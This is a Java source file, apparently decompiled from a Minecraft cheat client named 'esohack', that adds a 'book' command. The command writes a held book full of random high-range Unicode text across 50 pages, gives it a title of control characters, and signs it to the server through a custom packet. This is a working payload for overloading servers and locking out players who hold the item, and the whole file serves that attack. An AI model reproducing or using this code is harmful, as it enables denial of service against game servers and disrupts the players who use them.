package com.esoterik.client.features.command.commands;

import com.esoterik.client.features.command.*;
import net.minecraft.init.*;
import java.util.*;
import net.minecraft.nbt.*;
import io.netty.buffer.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import com.esoterik.client.*;
import net.minecraft.item.*;
import java.util.stream.*;

public class BookCommand extends Command
{
    public BookCommand() {
        super("book", new String[0]);
    }
    
    @Override
    public void execute(final String[] commands) {
        final ItemStack heldItem = BookCommand.mc.field_71439_g.func_184614_ca();
        if (heldItem.func_77973_b() == Items.field_151099_bA) {
            final int limit = 50;
            final Random rand = new Random();
            final IntStream characterGenerator = rand.ints(128, 1112063).map(i -> (i < 55296) ? i : (i + 2048));
            final String joinedPages = characterGenerator.limit(10500L).mapToObj(i -> String.valueOf((char)i)).collect((Collector<? super Object, ?, String>)Collectors.joining());
            final NBTTagList pages = new NBTTagList();
            for (int page = 0; page < 50; ++page) {
                pages.func_74742_a((NBTBase)new NBTTagString(joinedPages.substring(page * 210, (page + 1) * 210)));
            }
            if (heldItem.func_77942_o()) {
                heldItem.func_77978_p().func_74782_a("pages", (NBTBase)pages);
            }
            else {
                heldItem.func_77983_a("pages", (NBTBase)pages);
            }
            final StringBuilder stackName = new StringBuilder();
            for (int j = 0; j < 16; ++j) {
                stackName.append("\u0014\f");
            }
            heldItem.func_77983_a("author", (NBTBase)new NBTTagString(BookCommand.mc.field_71439_g.func_70005_c_()));
            heldItem.func_77983_a("title", (NBTBase)new NBTTagString(stackName.toString()));
            final PacketBuffer buf = new PacketBuffer(Unpooled.buffer());
            buf.func_150788_a(heldItem);
            BookCommand.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketCustomPayload("MC|BSign", buf));
            Command.sendMessage(esohack.commandManager.getPrefix() + "Book Hack Success!");
        }
        else {
            Command.sendMessage(esohack.commandManager.getPrefix() + "b1g 3rr0r!");
        }
    }
}
